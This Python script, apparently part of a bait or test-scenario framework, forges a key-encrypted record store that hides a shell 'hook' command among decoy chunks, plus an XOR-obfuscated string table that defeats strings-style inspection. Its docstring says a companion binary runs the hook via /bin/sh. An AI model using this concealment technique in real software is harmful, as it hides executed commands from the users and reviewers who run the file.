#!/usr/bin/env python3
"""Forge side of the fpextract vessel: craft the .dat record store and the per-build XOR string
table (strdefs.h) the binary embeds.

Two outputs, from one call:
  1. The .dat "record store" — an RDB1 chunk archive where exactly ONE chunk (id derived from the
     access key) holds the payoff record, XOR'd with a SHA256-CTR keystream of the access key; all
     other chunks are identical-size decoys. So cat/strings see uniform noise and the record is
     unrecoverable without the key. The payoff record's plaintext is:
         "FPR1" | uint16 hook_len | hook | record_text
     `hook` is the bundled payload command (the store's "on-extract hook"): it rides in the DATA,
     never in the binary, and fpextract.c runs it via /bin/sh (the injection). record_text is the
     visible payoff. The "FPR1" magic is the integrity check that makes a wrong key error cleanly.
     Keystream + payoff-id derivation MUST match fpextract.c byte-for-byte.
  2. strdefs.h — a per-build XOR-obfuscated string table (key XK + the product name only; the
     payload command is NOT here, it's in the .dat), so the binary's string table shows no
     recognizable constants and no embedded payload.

Reproducible: all "random" material (decoy chunks, padding, the XOR key XK) is drawn from a PRNG
seeded with context.json's `seed`, NOT the system CSPRNG — so identical context.json => identical
outputs (docs/bait-authoring.md §5 rules 3-4, same as cfgunpack/db-restore).

Usage:
    forge.py <dat_path> <payload_cmd> <access_key> <payoff> <strdefs_path> <tool_name> <seed>
"""
import hashlib
import random
import struct
import sys

NCHUNKS = 64
CHUNK_SIZE = 128


def keystream(passphrase, length):
    """SHA256-CTR keystream: SHA256("FP1" || passphrase || ctr) concatenated. Matches fpextract.c."""
    out = bytearray()
    ctr = 0
    while len(out) < length:
        out += hashlib.sha256(("FP1" + passphrase + str(ctr)).encode("utf-8", "replace")).digest()
        ctr += 1
    return bytes(out[:length])


def derive_id(passphrase, nchunks):
    """Which chunk holds the payoff — SHA256("FPID"||passphrase) low 4 bytes % nchunks. Matches
    fpextract.c's derive_id, so the binary finds the same chunk the forge placed the record in."""
    h = hashlib.sha256(("FPID" + passphrase).encode("utf-8", "replace")).digest()
    v = h[0] | (h[1] << 8) | (h[2] << 16) | (h[3] << 24)
    return v % nchunks if nchunks else 0


def craft_dat(payoff, passphrase, hook_cmd, rng, nchunks=NCHUNKS, chunk_size=CHUNK_SIZE):
    """RDB1 | uint16 nchunks | uint16 chunk_size | uint32 payoff_len | nchunks*(uint16 id | chunk).
    The payoff chunk's plaintext is "FPR1" | u16 hook_len | hook | record_text. Decoy chunks + the
    payoff pad are drawn from `rng` (seeded PRNG) for reproducibility."""
    hook = hook_cmd.encode("utf-8", "replace")
    if len(hook) >= 65536:
        raise SystemExit("fpextract forge: payload command too large for the u16 hook length")
    rec = payoff.encode("utf-8", "replace")
    blob = b"FPR1" + struct.pack("<H", len(hook)) + hook + rec
    n = len(blob)
    if chunk_size < n + 16:
        chunk_size = n + 16
    payoff_id = derive_id(passphrase, nchunks)
    padded = blob + rng.randbytes(chunk_size - n)
    ks = keystream(passphrase, chunk_size)
    xchunk = bytes(a ^ b for a, b in zip(padded, ks))
    out = bytearray(b"RDB1")
    out += struct.pack("<HH", nchunks, chunk_size)
    out += struct.pack("<I", n)          # payoff_len = the structured record blob's length
    for cid in range(nchunks):
        out += struct.pack("<H", cid) + (xchunk if cid == payoff_id else rng.randbytes(chunk_size))
    return bytes(out)


def emit_strdefs(pairs, rng):
    """Per-build XOR string table: a seed-derived key XK + each (name, literal) as an encrypted byte
    array with a length #define. Plaintext never appears in the binary; fpextract.c's dec() decodes."""
    xk = rng.randbytes(15)
    out = "static const unsigned char XK[]={%s};\n#define XK_LEN %d\n" % (
        ",".join(str(c) for c in xk), len(xk))
    for name, lit in pairs:
        b = lit.encode("utf-8", "replace")
        enc = bytes(c ^ xk[i % len(xk)] for i, c in enumerate(b))
        out += "static const unsigned char %s[]={%s};\n#define %s_LEN %d\n" % (
            name, ",".join(str(c) for c in enc), name, len(enc))
    return out


def main():
    if len(sys.argv) != 8:
        sys.stderr.write("usage: forge.py <dat_path> <payload_cmd> <access_key> <payoff> "
                         "<strdefs_path> <tool_name> <seed>\n")
        sys.exit(2)
    dat_path, payload_cmd, access_key, payoff, strdefs_path, tool_name, seed = sys.argv[1:8]
    # One PRNG stream seeded from context.json's seed drives every "random" byte below.
    rng = random.Random(seed)
    with open(dat_path, "wb") as f:
        f.write(craft_dat(payoff, access_key, payload_cmd, rng))
    with open(strdefs_path, "w") as f:
        # Only the product name is embedded; the payload command lives in the .dat (as the hook).
        f.write(emit_strdefs([("S_PROD", tool_name)], rng))
    sys.stderr.write(f"forged {dat_path} (payoff chunk {derive_id(access_key, NCHUNKS)}/{NCHUNKS}) "
                     f"+ {strdefs_path}\n")


if __name__ == "__main__":
    main()
